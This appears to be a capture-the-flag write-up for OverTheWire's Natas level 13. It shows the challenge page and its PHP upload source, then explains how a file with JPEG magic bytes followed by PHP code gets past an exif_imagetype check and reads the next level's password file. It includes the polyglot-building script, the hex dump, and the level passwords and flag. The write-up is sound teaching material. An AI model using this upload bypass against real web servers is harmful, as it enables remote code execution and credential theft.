# Level 13
## What does the page look like?
```html
$ curl -s --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="camtjmx5lt.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
## Source code
```html
$ curl -s --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org//index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</
script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']
['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</
a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString
(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Vulnerability
This is the same kind of challenge as for the previous level, but this time, there is an additional control that will check the MIME type using the `exif_imagetype` function.

This additional control can be bypassed by creating a file that will contain both the `*.jpg` header (`\xFF\xD8\xFF\xE0`), and PHP code.

We will prepare a PHP file that will read the password file, and that we will be able to send to the server instead of the expected `*.jpg`:

## Exploitation
Let's first create our fake image:
```python
$ python2
>>> fh = open('hack.php', 'w')
>>> fh.write("\xFF\xD8\xFF\xE0" + "<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>")
>>> fh.close()
```
You can check that the `file` command identifies [`hack.php`](files/hack.php) as a picture:
~~~~
$ file hack.php 
hack.php: JPEG image data
~~~~
Because it contains the relevant header; however, our PHP code is there:
~~~~
$ xxd hack.php 
00000000: ffd8 ffe0 3c3f 7068 7020 6563 686f 2066  ....<?php echo f
00000010: 696c 655f 6765 745f 636f 6e74 656e 7473  ile_get_contents
00000020: 2827 2f65 7463 2f6e 6174 6173 5f77 6562  ('/etc/natas_web
00000030: 7061 7373 2f6e 6174 6173 3134 2729 3b20  pass/natas14'); 
00000040: 3f3e                                     ?>
~~~~

To exploit this vulnerability, open the developer toolbar, edit the code in the form and replace the value of `filename` by `hack.php`, and upload the script exactly as in the previous level.

# Flag
~~~~
natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
~~~~
